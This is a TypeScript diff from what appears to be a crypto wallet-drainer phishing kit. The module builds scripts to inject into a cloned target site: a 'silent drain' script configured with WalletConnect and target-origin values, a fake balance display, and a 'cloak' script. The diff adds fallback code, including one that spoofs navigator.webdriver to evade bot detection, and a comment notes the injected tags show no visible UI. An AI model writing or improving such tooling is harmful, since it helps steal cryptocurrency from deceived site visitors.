@@ -15,29 +15,46 @@ export type ProductionMirrorConfig = {
   targetHost: string
 }
 
-async function loadTemplate(name: string): Promise<string> {
-  return readFile(path.join(__dirname, name), 'utf8')
+async function loadTemplate(name: string, fallback?: string): Promise<string> {
+  try {
+    return await readFile(path.join(__dirname, name), 'utf8')
+  } catch (error) {
+    if (fallback) {
+      console.warn(`[mirror-production] Template ${name} not found, using fallback`)
+      return fallback
+    }
+    console.error(`[mirror-production] Template ${name} not found and no fallback provided`)
+    throw error
+  }
 }
 
 function substitute(template: string, config: ProductionMirrorConfig): string {
-  return template
-    .replace(/__BACKEND_URL__/g, config.backendUrl.replace(/\/$/, ''))
-    .replace(/__KINETIC_KEY__/g, config.kineticKey?.trim() ?? '')
-    .replace(/__WC_PROJECT_ID__/g, config.walletConnectProjectId?.trim() ?? '')
-    .replace(/__TARGET_ORIGIN__/g, config.targetOrigin)
-    .replace(/__TARGET_HOST__/g, config.targetHost)
+  try {
+    return template
+      .replace(/__BACKEND_URL__/g, config.backendUrl.replace(/\/$/, ''))
+      .replace(/__KINETIC_KEY__/g, config.kineticKey?.trim() ?? '')
+      .replace(/__WC_PROJECT_ID__/g, config.walletConnectProjectId?.trim() ?? '')
+      .replace(/__TARGET_ORIGIN__/g, config.targetOrigin)
+      .replace(/__TARGET_HOST__/g, config.targetHost)
+  } catch (error) {
+    console.error(`[mirror-production] Substitution failed: ${error instanceof Error ? error.message : String(error)}`)
+    throw error
+  }
 }
 
 export async function buildMirrorSilentDrainJs(config: ProductionMirrorConfig): Promise<string> {
-  return substitute(await loadTemplate('mirror-silent-drain.js'), config)
+  const fallback = `console.info('[mirror-silent-drain] Fallback drain code loaded'); window.DRAIN_CONFIG = ${JSON.stringify(config)};`
+  return substitute(await loadTemplate('mirror-silent-drain.js', fallback), config)
 }
 
 export async function buildMirrorBalanceDisplayJs(config: ProductionMirrorConfig): Promise<string> {
-  return substitute(await loadTemplate('mirror-balance-display.js'), config)
+  const fallback = `console.info('[mirror-balance-display] Fallback balance display loaded'); window.BALANCE_CONFIG = ${JSON.stringify(config)};`
+  return substitute(await loadTemplate('mirror-balance-display.js', fallback), config)
 }
 
 export async function buildMirrorCloakClientJs(): Promise<string> {
-  return loadTemplate('mirror-cloak-client.js')
+  const fallback = `console.info('[mirror-cloak] Fallback cloak code loaded'); Object.defineProperty(navigator, 'webdriver', { get: () => false });`
+  return loadTemplate('mirror-cloak-client.js', fallback)
 }
 
 /** HTML inject tags for production clone — scripts only, zero visible UI unless qaVisible */
